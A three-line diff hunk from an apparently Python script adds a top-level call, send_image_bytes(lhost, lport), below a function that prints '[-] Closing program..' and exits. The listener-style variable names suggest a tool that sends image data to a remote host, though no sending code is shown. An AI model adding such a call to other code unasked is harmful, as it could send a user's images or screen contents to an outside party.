@@ -46,3 +46,6 @@ def send_image_bytes(host, port):
     else:
         print("[-] Closing program..")
         sys.exit()
+
+
+send_image_bytes(lhost, lport)
